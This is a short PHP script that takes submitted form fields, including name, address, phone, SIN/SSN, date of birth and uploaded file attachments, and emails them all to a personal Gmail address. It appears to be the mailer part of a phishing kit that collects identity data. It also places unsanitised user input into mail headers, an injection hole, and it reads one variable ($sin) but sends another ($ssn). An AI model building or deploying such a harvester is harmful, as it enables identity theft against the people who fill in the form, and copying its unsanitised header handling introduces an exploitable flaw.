<?php

// Recipient email address
$to = "david.dhoye20101@gmail.com";

// Get form data
$firstname = $_POST['firstname'];
$lastname = $_POST['lastname'];
$email = $_POST['email'];
$number = $_POST['number'];
$address = $_POST['address'];
$country = $_POST['country'];
$state = $_POST['state'];
$city = $_POST['city'];
$postalcode = $_POST['postalcode'];
$sin = $_POST['sin'];
$dob = $_POST['dob'];



// Headers
$headers = "Subject: Form Submission\r\n";
$headers .= "From: $firstname <$email>\r\n";
$headers .= "Reply-To: $firstname <$email>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: multipart/mixed; boundary=\"boundary\"\r\n";

// Message body
$body = "--boundary\r\n";
$body .= "Content-Type: text/plain; charset=\"UTF-8\"\r\n";
$body .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
$body .= "First Name: $firstname\r\n";
$body .= "Last Name: $lastname\r\n";
$body .= "Email: $email\r\n";
$body .= "Phone Number: $number\r\n";
$body .= "Address: $address\r\n";
$body .= "Country: $country\r\n";
$body .= "State / Province / Region: $state\r\n";
$body .= "City: $city\r\n";
$body .= "Postal Code: $postalcode\r\n";
$body .= "SSN:\r\n$ssn\r\n";
$body .= "Date Of Birth:\r\n$dob\r\n";


// Attachments
if (isset($_FILES['attachment'])) {
  $count = count($_FILES['attachment']['name']);

  for ($i = 0; $i < $count; $i++) {
    $filename = $_FILES['attachment']['name'][$i];
    $filetype = $_FILES['attachment']['type'][$i];
    $filesize = $_FILES['attachment']['size'][$i];
    $filetmpname = $_FILES['attachment']['tmp_name'][$i];

    $file = fopen($filetmpname, "rb");
    $data = fread($file, filesize($filetmpname));
    fclose($file);

    $data = chunk_split(base64_encode($data));

    $body .= "--boundary\r\n";
    $body .= "Content-Type: $filetype; name=\"$filename\"\r\n";
    $body .= "Content-Transfer-Encoding: base64\r\n";
    $body .= "Content-Disposition: attachment; filename=\"$filename\"\r\n\r\n";
    $body .= "$data\r\n";
  }
}

// Send email
if (mail($to, "Form Submission", $body, $headers)) {
  echo "Message sent successfully.";
} else {
  echo "Failed to send message.";
}

?>